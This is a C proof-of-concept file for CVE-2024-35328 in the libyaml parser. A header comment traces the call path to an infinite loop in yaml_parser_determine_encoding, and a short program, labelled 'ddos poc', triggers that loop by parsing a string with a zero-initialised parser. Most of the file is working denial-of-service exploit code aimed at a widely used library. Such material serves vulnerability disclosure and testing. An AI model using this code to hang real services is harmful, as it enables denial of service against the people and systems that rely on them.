/* CVE-2024-35328
Target:
    https://github.com/yaml/libyaml
    latest verify at 20240508, commit abd744ec2fb3b8e38e01796a1485c1f25f8fb5f6

Description:

the call stack is as follows:

yaml_parser_parse -> 
yaml_parser_state_machine -> 
yaml_parser_parse_stream_start -> 
PEEK_TOKEN -> yaml_parser_fetch_more_tokens -> 
yaml_parser_fetch_next_token -> 
CACHE -> yaml_parser_update_buffer -> 
yaml_parser_determine_encoding ->

yaml_parser_determine_encoding(yaml_parser_t *parser)
{
    while (!parser->eof
            && parser->raw_buffer.last - parser->raw_buffer.pointer < 3) {
        if (!yaml_parser_update_raw_buffer(parser)) {
            return 0;
        }
    }
    ...
}

yaml_parser_update_raw_buffer(yaml_parser_t *parser)
{
    size_t size_read = 0;

    if (parser->raw_buffer.start == parser->raw_buffer.pointer
            && parser->raw_buffer.last == parser->raw_buffer.end)
        return 1;
    ...
}

If the following conditions are met, will cause infinite loop
parser->eof = 0 && parser->raw_buffer.[start, end, pointer, last] = 0

This condition can be easy triggered by calling the API normally.



*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <yaml.h>

void poc() {
    yaml_event_t event;
    memset(&event, 0, sizeof(yaml_event_t));

    yaml_parser_t parser;
    memset(&parser, 0, sizeof(yaml_parser_t));

    yaml_parser_set_input_string(&parser, "rsslab", 6);
    yaml_parser_parse(&parser, &event);
}

int main(int argc, char *argv[])
{
    printf("ddos poc\n");
    poc();
    return 0;
}
